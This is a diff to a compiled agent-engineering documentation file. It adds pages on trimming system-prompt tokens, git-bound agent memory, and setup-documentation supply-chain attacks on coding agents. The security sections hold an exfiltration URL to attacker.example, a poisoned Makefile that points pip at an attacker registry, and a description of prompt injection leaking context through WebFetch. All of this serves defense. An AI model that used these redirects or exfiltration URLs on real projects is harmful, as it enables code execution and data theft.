@@ -314,6 +314,7 @@ Prefer a section-by-section entry point instead? [Foundations](foundations.md) l
 - [Proprioceptive Context Dashboard: Agent Self-Managed Context](context-engineering/proprioceptive-context-dashboard.md)
 - [Conversation Registers for AI Coding Sessions](context-engineering/conversation-registers.md)
 - [Agent-Initiated Rubric-Gated Self-Compaction (SelfCompact)](context-engineering/agent-initiated-self-compaction.md)
+- [Reducing System-Prompt Token Bloat in Coding Agents](context-engineering/system-prompt-bloat-reduction.md)
 
 ## Instructions & Prompts
 
@@ -637,6 +638,7 @@ Prefer a section-by-section entry point instead? [Foundations](foundations.md) l
 - [Agent Failure Trajectories and the Recovery Window](agent-design/failure-trajectory-recovery-window.md)
 - [DSLs as a Constraining Harness for LLM Code Generation](agent-design/dsl-constraining-harness.md)
 - [Minimum-Sufficient Execution: Estimate Scope Before Spending Budget](agent-design/minimum-sufficient-execution.md)
+- [Git-Bound Memory for the Agentic Development Lifecycle](agent-design/git-bound-memory.md)
 
 ## Loop Engineering
 
@@ -887,6 +889,7 @@ Prefer a section-by-section entry point instead? [Foundations](foundations.md) l
 - [Internal Hostname Disclosure in Agent-Readable Context](security/internal-hostname-disclosure-agent-context.md)
 - [Vetting Tool Definitions for Exfiltration Signatures](security/vetting-tool-definitions-before-install.md)
 - [Non-Human Event Provenance Markers to Block Fabricated Approvals](security/non-human-event-provenance-markers.md)
+- [Setup Documentation as an Install-Time Attack Vector](security/setup-documentation-install-time-attacks.md)
 
 ## Testing & Evaluation
 
@@ -1620,6 +1623,7 @@ Models do not attend uniformly across the context window. These pages cover wher
 Strategies for fitting more useful content into less space, and for making repeated prefixes cheaper through provider caching mechanisms.
 
 - [Context-Window Diagnostic Tooling](context-window-diagnostic-tooling.md) — Surface which tool calls are inflating the context window so you can optimize specific culprits rather than prune blindly
+- [Reducing System-Prompt Token Bloat in Coding Agents](system-prompt-bloat-reduction.md) — Measure the shipped system prompt with `/context`, then switch off unused tools, skills, and features so the fixed prefix stops crowding out task context
 - [Proprioceptive Context Dashboard](proprioceptive-context-dashboard.md) — Give a long-horizon agent a live view of its own context blocks — size, age, and usage — so it makes competent keep-or-archive decisions itself instead of a hidden layer compressing blindly
 - [PEEK: Orientation Cache for Recurring-Context Agents](peek-orientation-cache.md) — A constant-sized prompt artifact that caches reusable orientation knowledge — what is in a recurring context, how it is organised, which entities matter — distinct from trajectory replay and playbook strategy memory
 - [Context Compression Strategies](context-compression-strategies.md) — Long-running agents accumulate context that eventually fills the window; tiered compression — offloading large payloads and summarising history — lets agents continue working without losing task continuity
@@ -3492,6 +3496,7 @@ Per-tool attribution helps most when the expensive tool is also avoidable. It pr
 - [Context Window Anxiety](context-window-anxiety.md)
 - [Semantic Context Loading](semantic-context-loading.md)
 - [Proprioceptive Context Dashboard](proprioceptive-context-dashboard.md) — the agent-facing counterpart that surfaces per-block state to the model itself
+- [Reducing System-Prompt Token Bloat in Coding Agents](system-prompt-bloat-reduction.md) — the action after diagnosis: trim the tools and features the measurement flags as unused
 
 ---
 
@@ -4693,6 +4698,7 @@ All 50 runners produce one system-prompt prefix. The first runner pays the cache
 - [Prompt Caching: Architectural Discipline for Agents](prompt-caching-architectural-discipline.md)
 - [Static Content First for Cache Hits](static-content-first-caching.md)
 - [Dynamic System Prompt Composition](dynamic-system-prompt-composition.md)
+- [Reducing System-Prompt Token Bloat in Coding Agents](system-prompt-bloat-reduction.md) — a sibling Claude Code saving: remove unused tool and feature definitions rather than share the cache across machines
 
 ---
 
@@ -7058,6 +7064,80 @@ Reading its own state, the agent archives the stale, oversized `B17` — `archiv
 - [Turn-Level Context Decisions](turn-level-context-decisions.md) — the keep/rewind/clear/compact/delegate choice the dashboard supplies signals for.
 - [Observation Masking](observation-masking.md) — a lossy alternative that strips tool results outright, versus the reversible archive here.
 - [Context Compression Strategies](context-compression-strategies.md) — the hidden-layer compression this technique is positioned against.
+
+---
+
+### Reducing System-Prompt Token Bloat in Coding Agents
+Source: https://agentpatterns.ai/context-engineering/system-prompt-bloat-reduction/
+
+# Reducing System-Prompt Token Bloat in Coding Agents
+
+> Measure what fills a coding agent's system prompt, then cut the tools, skills, and features you never use to free the token budget.
+
+System-prompt token bloat is the static payload — tool definitions, a skills catalogue, and feature instructions — that a coding agent re-sends on every request whether you touch those features or not. You reduce it by measuring the payload first, then switching off the parts that do not earn their place, so the fixed prefix shrinks and more of the context window stays free for your task.
+
+Two conditions shape the payoff before you cut anything: with prompt caching active the win is mostly context-window headroom, not a large per-turn cost cut, and every cut disables a feature. Trim what you do not use, keep what your workflow relies on.
+
+## Measure before you trim
+
+Run `/context` in a Claude Code session. It breaks the context window into system prompt, system tools, MCP tools, memory files, and messages, each with a token count and its share of the window ([AI Hero — How To Kill The Bloat](https://www.aihero.dev/how-to-kill-the-bloat-in-claude-codes-system-prompt); [Claude Code — Manage costs](https://code.claude.com/docs/en/costs)). Note the numbers before changing anything so you can compare afterward.
+
+`/context` reports tools as one group, so it will not tell you which single tool is largest. To rank individual tools, route the CLI through a logging proxy that records each request untouched. Matt Pocock's proxy prints a ranked table — one run showed `69 tools · 154,946 tool bytes · 65,538 real input tokens`, with the `Workflow` tool alone at roughly 5,307 tokens ([AI Hero — How To Kill The Bloat](https://www.aihero.dev/how-to-kill-the-bloat-in-claude-codes-system-prompt)). The ranked list is your cut list. For the diagnostic side in more depth, see [context-window diagnostic tooling](context-window-diagnostic-tooling.md).
+
+## What to cut, and how
+
+Two Claude Code settings do the trimming, both in `~/.claude/settings.json` (all projects) or `.claude/settings.json` (one project).
+
+`disable*` flags switch off a whole feature and everything it carries: `disableBundledSkills` removes Anthropic's bundled skills and workflows while leaving their slash commands typable, `disableWorkflows` removes the `Workflow` tool, and `disableRemoteControl`, `disableClaudeAiConnectors`, and `disableArtifact` remove those features ([Claude Code — Settings](https://code.claude.com/docs/en/settings)).
+
+A `permissions.deny` rule with a bare tool name removes an individual tool's definition from the payload. The distinction matters: a bare name (`"NotebookEdit"`) drops the definition, while a scoped rule (`"Bash(rm *)"`) only blocks the matching call and leaves the schema in the payload, so it saves no tokens ([AI Hero](https://www.aihero.dev/how-to-kill-the-bloat-in-claude-codes-system-prompt), observed by reading the proxied requests). When `disableBundledSkills` is too blunt, `skillOverrides` set to `"off"` or `"user-invocable-only"` drops individual bundled skills instead.
+
+Then restart and re-run `/context` to confirm the drop. Do not hand-prune MCP servers first: Claude Code already defers MCP tool definitions by default through tool search, so the trimmable weight is mostly built-in tools, skills, and features, not MCP ([Claude Code — Manage costs](https://code.claude.com/docs/en/costs); [Anthropic — advanced tool use](https://www.anthropic.com/engineering/advanced-tool-use)).
+
+## Why it works
+
+Each turn is a stateless API request that re-sends the whole system prompt and every tool schema before the model reaches your task ([Claude Code — Manage costs](https://code.claude.com/docs/en/costs); [MCP schema overhead, issue #2808](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/2808)). Tool and feature definitions sit in that fixed prefix, so removing a definition shrinks the prefix permanently. Token cost scales with context size and the window is finite, so a smaller prefix leaves more room for task context and less for the model to read past before it reaches your problem.
+
+## When this backfires
+
+Trimming is conditional, not free:
+
+- Prompt caching already bills the repeated prefix as cache reads at a fraction of the base input cost, so the per-turn dollar saving is smaller than the raw token delta implies ([Claude Code — Manage costs](https://code.claude.com/docs/en/costs)). The durable win is context-window headroom, not a large cost cut.
+- Every cut disables a feature. `disableWorkflows` removes the `Workflow` tool that background jobs and multi-agent runs depend on, and denying plan-mode or notebook tools removes those too ([AI Hero](https://www.aihero.dev/how-to-kill-the-bloat-in-claude-codes-system-prompt)). Keep what your workflow uses.
+- A shared `.claude/settings.json` deny list strips the tool for every teammate and every project — a blunt instrument that produces confusing capability gaps.
+- If your real cost driver is conversation history or large file reads, the static preamble is a rounding error. Clearing between tasks with `/clear` and keeping CLAUDE.md lean do more ([Claude Code — Manage costs](https://code.claude.com/docs/en/costs)).
+
+## Example
+
+A settings block that trims features you have measured as unused, drawn from Matt Pocock's published configuration ([AI Hero](https://www.aihero.dev/how-to-kill-the-bloat-in-claude-codes-system-prompt)):
+
+```json
+{
+  "permissions": {
+    "deny": ["NotebookEdit", "CronCreate", "CronDelete", "CronList"]
+  },
+  "disableBundledSkills": true,
+  "disableWorkflows": true,
+  "disableArtifact": true
+}
+```
+
+The bare names in `deny` remove those tool definitions from every request; the `disable*` flags remove whole feature clusters. Treat it as a menu, not a prescription — keep any feature your own `/context` run shows you actually use.
+
+## Key Takeaways
+
+- The shipped system prompt re-sends unused tool, skill, and feature definitions on every stateless turn; those tokens occupy the fixed prefix.
+- Measure with `/context` and a logging proxy before cutting, so you remove the exact tools you do not use instead of guessing.
+- Trim with `disable*` flags for whole features and bare-name `permissions.deny` rules for individual tools; scoped deny rules block calls but save no tokens.
+- With prompt caching active, the payoff is context-window headroom more than per-turn cost, and each cut removes a capability — keep what your workflow needs.
+
+## Related
+
+- [Context-Window Diagnostic Tooling](context-window-diagnostic-tooling.md) — the measurement step: attribute context growth to specific tools before you trim.
+- [Context Budget Allocation](context-budget-allocation.md) — the finite-budget principle this technique applies.
+- [Dynamic System Prompt Composition](dynamic-system-prompt-composition.md) — assembling prompts at runtime, distinct from removing dead weight.
+- [Exclude Dynamic System Prompt Sections for Cross-Machine Cache Sharing](exclude-dynamic-system-prompt-sections.md) — a different Claude Code system-prompt saving, aimed at cache sharing.
+- [Prompt Caching: Architectural Discipline for Agents](prompt-caching-architectural-discipline.md) — the caching economics behind the cost caveat above.
 
 ---
 
@@ -17148,6 +17228,7 @@ How agents persist, retrieve, and synthesize information across turns and sessio
 - [Memory Retrieval as a Control Decision](memory-retrieval-as-control.md) — Treat memory injection as a control decision — abstain, gate before action, or utility-rank retrieved memory rather than always injecting top-k
 - [Agent Memory Patterns: Learning Across Conversations](agent-memory-patterns.md) — Persist knowledge across conversations using scoped memory systems so agents accumulate institutional knowledge rather than starting fresh every session
 - [Code-Native Memory Substrates](code-native-memory-substrates.md) — Root agent memory in codebase artifacts — typed VCS units, AST diffs, and git-backed task graphs — so structure replaces lossy natural-language summaries
+- [Git-Bound Memory for the Agentic Development Lifecycle](git-bound-memory.md) — Bind agent memory to version control so commits, merges, and review supply the ground truth, freshness, and verification bespoke memory stores have to rebuild
 - [Executable Memory: User-State as Code for Personalized Agents](executable-memory-user-as-code.md) — Compile user memory into typed code with rule functions — beats retrieval 99% vs 6-43% on aggregate queries, loses to text retrieval on plain recall
 - [AX/UX/DX Triad: Three Experience Layers in Agent Systems](ax-ux-dx-triad.md) — Treat Agent Experience, User Experience, and Developer Experience as separate design surfaces — conflating them degrades all three
 - [CoALA Memory Taxonomy as a Classifier for Harness Artifacts](coala-memory-taxonomy-classifier.md) — Apply CoALA's four memory types as a classifier over the artifacts an agent harness already has; the value is diagnostic, not prescriptive
@@ -22042,6 +22123,7 @@ When the agent proposes the refactored version, the AST diff against stored memo
 - [Session Initialization Ritual](session-initialization-ritual.md) — the startup sequence that pairs with `bd ready` for full session orientation
 - [Context Compression Strategies](../context-engineering/context-compression-strategies.md) — structural compression for context management
 - [Wiki Memory: Agent-Maintained Compressed Knowledge Base](wiki-memory-agent-maintained-knowledge-base.md) — the general, prose-and-files counterpart to these code-rooted substrates
+- [Git-Bound Memory for the Agentic Development Lifecycle](git-bound-memory.md) — binds memory to version-control primitives (merge review, append-only ledger) rather than typed extractions from history
   - long-form
 
 ---
@@ -26539,6 +26621,58 @@ The architecture is an integrated system, not a single technique:
 
 ---
 
+### Git-Bound Memory for the Agentic Development Lifecycle
+Source: https://agentpatterns.ai/agent-design/git-bound-memory/
+
+# Git-Bound Memory for the Agentic Development Lifecycle
+
+> Git-bound memory stores agent decision history in version control, inheriting ground truth, freshness, and verification from commits, merges, and review.
+
+Git-bound memory records the reasoning behind agent-made changes inside the repository's version control rather than in a separate store. It works when a team already captures agent sessions and links each to the commit it produced. Given that link, commits, merges, and code review supply the ground truth, freshness, and verification that tiered stores, memory graphs, and compiled wikis have to reconstruct with their own machinery ([Guo, 2026](https://arxiv.org/abs/2607.14390)). Without session capture there is nothing to bind, so the approach depends on that discipline before anything else — the paper states plainly that the binding constraint is capture, not ranking.
+
+## When it applies
+
+Reach for git-bound memory when three conditions hold: agent sessions are captured and SHA-linked to their commits by a post-commit hook; agents verbalize their reasoning in-session, since only recorded rationale can be recovered later; and retrieval gates injected context on confidence rather than dumping top-ranked sessions into every prompt. Miss any one and a dedicated memory store is the better bet.
+
+## How it works
+
+The design splits memory into two problems the usual single-retrieval framing conflates. Seed supply finds the relevant past sessions; answer assembly synthesizes a response from them. Questions then route by type: structural maps answer breadth questions, gated episode lookups answer pointed questions, and decision synthesis gathers the relevant turns to answer "why" questions ([Guo, 2026](https://arxiv.org/abs/2607.14390)). Routing matters because one retrieval mode does not fit every question — single-shot retrieval scored 0 to 0.33 sufficiency on rationale questions, while decision synthesis reached 0.83 on the same corpus.
+
+## Why it works
+
+Git-bound memory reuses verification infrastructure the team already runs instead of rebuilding it. Ground truth is discoverable rather than hand-labeled, because a commit already ties a session to a merged, reviewed, CI-passed change. Freshness is automatic, because the index regenerates from an append-only ledger and compiled maps refresh by diffing only the sections that changed. Admission control comes for free, because only merged commits become shareable, so the merge gate doubles as the memory's review step ([Guo, 2026](https://arxiv.org/abs/2607.14390)). On a roughly 50,000-line production system the routed system answered 60% of real questions sufficiently, at 382 to 980 tokens per question against the tens of thousands a full-history scan would cost.
+
+## When this backfires
+
+Memory keyed to code state can go stale in ways git itself does not catch: outdated entries in a retrieval store reduce answer accuracy even when current information is also present ([Ouyang et al., 2025](https://arxiv.org/abs/2503.04800)), so a session describing a refactor later reverted with `git checkout` still points at an architecture that no longer exists. Naive retrieval actively hurts: injecting ungated low-confidence sessions dropped sufficiency from 0.63 to 0.29, and only confidence gating recovered it to 0.50 ([Guo, 2026](https://arxiv.org/abs/2607.14390)). Synthesis recovers only rationale that was verbalized, so agents that work silently leave little to bind, and map quality depends entirely on the repository's own structure and docs ([Guo, 2026](https://arxiv.org/abs/2607.14390)). The supporting study is small (12 to 15 questions per corpus, a single judge, wide intervals) and tested only on young history, so treat the numbers as directional.
+
+## Example
+
+Structured commit trailers are the lightest way to start binding rationale to history. The Lore protocol encodes triggers, root causes, and rejected approaches into commit messages so a later agent retrieves them with `git log --grep` before writing code ([Stetsenko, 2026](https://arxiv.org/abs/2603.15566)):
+
+```bash
+git log --grep="rejected-approach" -- src/auth/
+```
+
+The trailer captures what the diff cannot — the alternatives weighed and why they were dropped — and it lives in the same history the merge gate already reviews.
+
+## Key takeaways
+
+- Git-bound memory inherits ground truth, freshness, and admission control from commits, merges, and review rather than rebuilding them in a separate store.
+- It depends on session capture: with no SHA-linked, verbalized sessions there is nothing to bind, and the paper names capture as the binding constraint.
+- Route questions by type — maps for breadth, gated episodes for lookup, synthesis for "why" — and gate injected context on confidence, since ungated dumping degrades answers.
+- Memory keyed to code state can describe reverted architectures; git-bound memory is not a single fix for retrieval, live state, and personalization at once.
+
+## Related
+
+- [Code-Native Memory Substrates for Coding Agents](code-native-memory-substrates.md) — typed units from VCS history and AST diffs; the structural counterpart to binding memory to git primitives
+- [Memory Synthesis: Extracting Lessons from Execution Logs](memory-synthesis-execution-logs.md) — recovering causal rationale from traces, the capture step git-bound memory depends on
+- [Wiki Memory: Agent-Maintained Compressed Knowledge Base](wiki-memory-agent-maintained-knowledge-base.md) — a compiled-store alternative git-bound memory argues against
+- [Tiered Memory Architecture](tiered-memory-architecture.md) — the separately-maintained store this pattern replaces
+- [Agent Memory Patterns: Learning Across Conversations](agent-memory-patterns.md) — the scope-and-temporal taxonomy git-bound memory slots into as a cross-session source
+
+---
+
 ### Goal Contract: Separating the Doer from the Done-Checker
 Source: https://agentpatterns.ai/agent-design/goal-contract-completion-evaluator/
 
@@ -30214,6 +30348,7 @@ The raw observation records what happened. The synthesized lesson records what t
 - [Agent Transcript Analysis](../verification/agent-transcript-analysis.md)
 - [Context Engineering: The Discipline of Designing Agent Context](../context-engineering/context-engineering.md)
 - [Wiki Memory: Agent-Maintained Compressed Knowledge Base](wiki-memory-agent-maintained-knowledge-base.md) — the general form that synthesizes arbitrary domain sources, where this page mines lessons from execution traces
+- [Git-Bound Memory for the Agentic Development Lifecycle](git-bound-memory.md) — binds synthesized rationale to commits so the merge gate verifies it; depends on the capture this page describes
 
 ---
 
@@ -82190,6 +82325,7 @@ Agents dynamically load tools from MCP servers, plugins, and registries at runti
 - [LLM-Pinned Library Versions Carry Systemic CVE Exposure](llm-pinned-vulnerable-versions.md) — Across 10 models on 1,000 Python tasks, 36.7%-55.7% of LLM-specified versions contain known CVEs and all models converge on the same risky releases — pin against an external vulnerability source, not the model's training prior
 - [Skill Composition Risk in Agent Ecosystems](skill-composition-risk.md) — Skills benign in isolation become harmful when one skill's output flows into the next; three failure modes (CapFlow, TrustLift, AuthBlur) reach 33.6%, 96.5%+, and 71.8% relative attack success across ten production backends, and per-skill vetting misses them by construction
 - [Skill Supply-Chain Poisoning](skill-supply-chain-poisoning.md) — Malicious skills injected into public registries exploit in-context learning to execute payloads hidden in documentation examples, bypassing alignment that blocks explicit instruction injection
+- [Setup Documentation as an Install-Time Attack Vector](setup-documentation-install-time-attacks.md) — Setup docs are unverified install authority; editing only a README, requirements file, or Makefile redirects an agent's install to a wrong name, untrusted registry, or vulnerable version, and the payload runs at install time — agents catch typosquats but miss source-based redirects almost everywhere
 - [Slopsquatting: Hallucinated Package Names as a Supply-Chain Vector](slopsquatting-hallucinated-package-names.md) — Coding LLMs hallucinate package names at 5.2%-21.7%; 43% of those names persist across re-runs, making them enumerable — attackers register the persistent names and the agent's install step pulls the malicious package
 - [Tool Signing and Signature Verification](tool-signing-verification.md) — Require cryptographic signature verification (Sigstore/Cosign) before an agent loads or invokes a tool
 
@@ -82800,6 +82936,7 @@ The next `npm install <pkg>` an agent runs writes `1.12.0`, not `^1.12.0`. CI in
 ## Related
 
 - [LLM-Pinned Library Versions Carry Systemic CVE Exposure](llm-pinned-vulnerable-versions.md) — the orthogonal axis: exact-but-CVE-bearing pins from the training prior
+- [Setup Documentation as an Install-Time Attack Vector](setup-documentation-install-time-attacks.md) — the attacker-authored manifest: an edited README or Makefile redirects the install, closed by the same lockfile-enforced control
 - [Dependency Gap Validation for AI-Generated Code](../verification/dependency-gap-validation.md) — the missing-dependency complement; the same lock-then-resolve workflow covers transitive pulls
 - [Scanner-as-MCP-Server: Secret and Dependency Scans as Typed Agent Tools](scanner-as-mcp-server.md) — the agent-side scanning surface that complements lockfile enforcement
 - [Lethal Trifecta Threat Model](lethal-trifecta-threat-model.md) — the broader frame; a permissive range plus untrusted-content tool plus egress is one shape of the trifecta
@@ -87844,6 +87981,8 @@ https://attacker.example/collect?user=alice@corp.com&session=abc123&data=<contex
 
 The leak happens at the HTTP request level. The attacker's server logs the URL. The user sees nothing unusual in the chat. No response body needs to be read — the request alone does the damage. [Source: [AI Agent Link Safety](https://openai.com/index/ai-agent-link-safety/)]
 
+This is not hypothetical. A documented instance manipulated Claude's WebFetch tool into leaking prior conversation context by constructing a request URL that carried the secret data — the URL-as-data-channel thesis realised against a first-class coding-agent tool ([Simon Willison — Claude WebFetch exfiltration](https://simonwillison.net/2026/Jul/15/claude-web-fetch-exfiltration/)).
+
 Redirect chains extend this attack. A URL points to a trusted domain that the agent might allowlist, then forwards straight to an attacker-controlled destination. The agent follows the redirect, and the attacker receives the request with the full query parameters. [Source: [AI Agent Link Safety](https://openai.com/index/ai-agent-link-safety/)]
 
 The same attack hits embedded resources, not just top-level navigation. The agent fetches images, iframes, and other embedded content before the user can inspect them. [Source: [AI Agent Link Safety](https://openai.com/index/ai-agent-link-safety/), [Exploiting Web Search Tools of AI Agents for Data Exfiltration](https://arxiv.org/abs/2510.09093)]
@@ -89122,6 +89261,8 @@ Poisoned dependency ([Lynch / NVIDIA, 2025](https://developer.nvidia.com/blog/fr
 Cross-agent privilege escalation ([Embrace The Red, 2025](https://embracethered.com/blog/posts/2025/cross-agent-privilege-escalation-agents-that-free-each-other/)): one agent rewrites another's config to drop sandbox constraints, granting all three legs. Fix: protect config from writes.
 
 MCP tool exfiltration ([Invariant Labs, 2025](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)): a malicious MCP server shadows trusted tools, reads private context, and forwards it externally. Fix: restrict MCP server egress.
+
+WebFetch exfiltration ([Willison, 2026](https://simonwillison.net/2026/Jul/15/claude-web-fetch-exfiltration/)): a worked demonstration against Claude's WebFetch tool, manipulated into leaking prior conversation context (private data) through a crafted request URL once untrusted input enters context — private data, untrusted input, and egress converging on a single tool call in a first-class coding-agent tool. Fix: remove egress or constrain the fetch destination.
 
 ## Trifecta audit checklist
 
@@ -93940,6 +94081,101 @@ In auto-approve mode, step 3 cancels the command instead and the agent receives 
 
 ---
 
+### Setup Documentation as an Install-Time Attack Vector
+Source: https://agentpatterns.ai/security/setup-documentation-install-time-attacks/
+
+# Setup Documentation as an Install-Time Attack Vector
+
+> An attacker who edits only a README, requirements file, or Makefile turns project setup into install-time code execution the agent runs unverified.
+
+An AI coding agent asked to set up a project reads its documentation and installs what that documentation lists — without checking whether the package names are real, the registry is trusted, or the versions carry known CVEs. That makes setup documentation an install authority the agent obeys, so editing only a README, `requirements.txt`, `pyproject.toml`, or `Makefile` redirects the install to a wrong-but-plausible name, an attacker-controlled registry, or a known-vulnerable release. The first systematic evaluation of this surface probes four production harnesses across nine harness-model configurations on twelve scenarios in five attack classes ([arXiv:2607.15143](https://arxiv.org/abs/2607.15143)).
+
+The distinguishing property is when the code runs. A typosquat or a registry redirect executes at install time through a package's `setup.py` or an import hook — before any code review, test, or human glance at the result. The [torchtriton dependency-confusion attack](https://pytorch.org/blog/compromised-nightly-dependency/) worked this way: a malicious `torchtriton` on public PyPI shadowed the package PyTorch shipped from its own index, `pip` installed the public one by default, and the payload harvested SSH keys and environment variables the moment it landed ([Wiz](https://www.wiz.io/blog/malicious-pytorch-dependency-torchtriton-on-pypi-everything-you-need-to-know)).
+
+## The five attack classes
+
+Each class violates a different trust property of an install — that the package is authentic, the intended one, and safe ([arXiv:2607.15143](https://arxiv.org/abs/2607.15143)):
+
+- Name-based — a typosquat or separator-confusion name (`azurecore` for `azure-core`) in the manifest.
+- Source-based — a redirect to an untrusted registry via an `--extra-index-url` flag or a hidden index directive in `requirements.txt`.
+- Version-based — a pin to a release with a known CVE.
+- Configuration-based — a build file that redirects resolution, for example a `Makefile` that sets `PIP_CONFIG_FILE`.
+- Output-based — an error message that suggests installing an attacker's package.
+
+The detection results invert the human threat model. Agents catch blatant typosquats reliably — an obvious `tranformers` misspelling was refused 30/30 — because those names recur in the security advisories the models trained on. Source-based attacks are missed almost everywhere: several harness-model pairs installed the untrusted registry 0 times out of 10, because `--extra-index-url` is a routine flag whose malicious uses are rare in training data. The plausible middle, separator confusion, splits by pairing — caught 30/30 on one configuration and 2/30 on another ([arXiv:2607.15143](https://arxiv.org/abs/2607.15143)).
+
+## Why it works
+
+The mechanism is that none of the three trust properties is verified anywhere in the install chain. The agent runs `pip install` without inspecting package contents and removes the human who would otherwise pause to check the name and source, so a manifest edit flows straight to code execution ([arXiv:2607.15143](https://arxiv.org/abs/2607.15143), Section 9.1). This is the same unverified-install-authority gap that makes model-hallucinated names exploitable in [slopsquatting](slopsquatting-hallucinated-package-names.md) — here the attacker authors the manifest instead of the model.
+
+Two findings make the surface durable. First, the relevant security knowledge is present but dormant and dimension-specific: a prompt that names the source dimension lifted hidden-index detection from 0% to 93%, but had no effect on vulnerable version pins, which stayed at 0% until a version-targeted prompt raised refusal to 10/10 ([arXiv:2607.15143](https://arxiv.org/abs/2607.15143), Section 7). The default setup workflow simply does not activate reasoning the model can do on request. Second, install-then-flag is not prevention: once the install has run, the payload has already executed, so detecting it afterward reports a breach rather than stopping one.
+
+## Install-time security is a harness-model property
+
+The same model catches an attack through one harness and installs it through another — detection rests on the harness-model combination, not the model alone ([arXiv:2607.15143](https://arxiv.org/abs/2607.15143), Section 6.1). A pre-execution checkpoint let one model refuse an untrusted localhost registry 10/10 times; the same model through a run-then-report harness dropped to 9 refusals out of 30 (p=1.1×10⁻⁴). A harness that runs install commands immediately, with no per-command approval, forfeits the checkpoint however capable its model is.
+
+## Closing the vector
+
+Prompting recovers only the dimension it names, so the durable fix is deterministic. A pre-install gate that verifies name, source, and version before any install-time code runs — edit-distance and existence checks, package age, untrusted-source and hidden-directive detection, `PIP_CONFIG_FILE` inspection, and an OSV vulnerability lookup — caught 10 of 11 scenarios in the evaluation ([arXiv:2607.15143](https://arxiv.org/abs/2607.15143)). The practical controls:
+
+- Gate the install behind a checkpoint that runs before install-time code, not a review after it.
+- Treat the package source as a first-class trust signal: surface `--extra-index-url` and expand `requirements.txt` directives before executing them.
+- Never auto-act on an install suggested by program output.
+- Enforce a committed lockfile (`uv sync --frozen`, `npm ci`) so a name or source the lockfile never endorsed fails closed — the same control that gates [agent-emitted dependency ranges](agent-emitted-dependency-ranges.md) and [LLM-pinned vulnerable versions](llm-pinned-vulnerable-versions.md).
+
+## Example
+
+A poisoned `Makefile` redirects package resolution before the agent ever reads a package name:
+
+**Before — Makefile redirects resolution to an attacker index:**
+
+```makefile
+setup:
+	PIP_CONFIG_FILE=./.ci/pip.conf pip install -r requirements.txt
+# .ci/pip.conf sets index-url to an attacker-controlled registry;
+# every dependency now resolves from there, and setup.py runs at install
+```
+
+**After — the install is gated on a trusted source and a frozen lockfile:**
+
+```makefile
+setup:
+	uv sync --frozen   # installs only what the committed lockfile endorses,
+	                   # from the configured trusted index; an unlisted
+	                   # name or source fails closed before any code runs
+```
+
+The first target hands resolution to the documentation; the second treats the manifest as a claim to verify against a lockfile the agent cannot silently rewrite.
+
+## When this backfires
+
+The threat is real but bounded, and a setup-doc-specific gate is redundant in several shapes:
+
+- Committed lockfile with frozen installs (`npm ci`, `uv sync --frozen`): the doc-listed name or source never resolves, so the deviation fails closed without a separate check.
+- Ephemeral, network-restricted, secret-free install sandboxes: install-time execution has nothing to exfiltrate and no persistence, so the payoff falls below the defense cost.
+- Harnesses that already require per-command human approval before install catch most name-based attacks — a name-only check adds little there.
+- Projects that pull only canonical, top-tier dependencies from a single trusted index have minimal exposure to the separator-confusion and registry-redirect classes.
+
+The counter-argument is that an attacker who can edit your setup docs usually has repository write access and could inject a malicious code change directly. But documentation and CI-config changes draw less scrutiny than source diffs — the [Ultralytics compromise](https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/) shipped a crypto-miner through an innocuously-titled pull request that exploited the project's GitHub Actions release pipeline ([Snyk](https://snyk.io/blog/ultralytics-ai-pwn-request-supply-chain-attack/)). The vector also covers third-party repositories an agent is told to clone and set up, where the attacker is the legitimate repo author and needs no intruder access at all.
+
+## Key Takeaways
+
+- Setup documentation is unverified install authority: an agent installs the names, sources, and versions the docs list without checking any of them ([arXiv:2607.15143](https://arxiv.org/abs/2607.15143)).
+- The human threat model inverts — agents reliably catch blatant typosquats but miss source-based attacks like registry redirection almost everywhere, because malicious `--extra-index-url` uses are rare in training data.
+- Install-time security is a harness-model property: a pre-execution checkpoint let one model refuse an untrusted registry 10/10, while the same model in a run-then-report harness dropped to 9/30.
+- Prompting recovers only the dimension it names; a deterministic pre-install gate that verifies name, source, and version before any code runs caught 10 of 11 scenarios.
+- Install-then-flag is not prevention — the install-time payload executes before any after-the-fact warning can fire.
+
+## Related
+
+- [Slopsquatting: Hallucinated Package Names as a Supply-Chain Vector](slopsquatting-hallucinated-package-names.md) — the name-based sibling where the model authors the bad name instead of an attacker authoring the doc
+- [LLM-Pinned Library Versions Carry Systemic CVE Exposure](llm-pinned-vulnerable-versions.md) — the version dimension of the same install surface; pin against an external vulnerability source, not a training prior
+- [Agent-Emitted Dependency Version Ranges Widen the Supply-Chain Attack Surface](agent-emitted-dependency-ranges.md) — floating ranges as a third leg of the agent-authored-manifest surface, closed by the same lockfile control
+- [Improper Output Handling: Validate Agent Output Before Downstream Use](improper-output-handling-downstream-sinks.md) — the install sink is one of the downstream sinks that must be gated per-action
+- [Pre-Trust Execution Surface in Coding Agent Harnesses](pre-trust-execution-surface.md) — the adjacent gap where project-local config executes before the trust prompt fires
+
+---
+
 ### Skill Composition Risk in Agent Ecosystems
 Source: https://agentpatterns.ai/security/skill-composition-risk/
 
@@ -94440,6 +94676,7 @@ Same shape as the LLM-pinned-CVE finding: a measurement-grounded threat that ord
 
 - [LLM-Pinned Library Versions Carry Systemic CVE Exposure](llm-pinned-vulnerable-versions.md) — the version analogue: real package, vulnerable release; same training-distribution mechanism, different exploit shape
 - [Agent-Emitted Dependency Version Ranges Widen the Supply-Chain Attack Surface](agent-emitted-dependency-ranges.md) — the third leg of the agent-authored-manifest threat surface; caret ranges admit future-compromised releases of names that already exist
+- [Setup Documentation as an Install-Time Attack Vector](setup-documentation-install-time-attacks.md) — the attacker-authored counterpart: the same unverified install authority, but the bad name or source arrives in an edited README or Makefile rather than the model's output
 - [Skill Supply-Chain Poisoning](skill-supply-chain-poisoning.md) — adjacent supply-chain attack via the skill registry rather than the package registry
 - [Blast Radius Containment: Least Privilege for AI Agents](blast-radius-containment.md) — the principle that gates agent install authority in the first place
 - [Always-On Agentic PR Security Review](always-on-pr-security-review.md) — the CI surface where manifest changes get reviewed before install
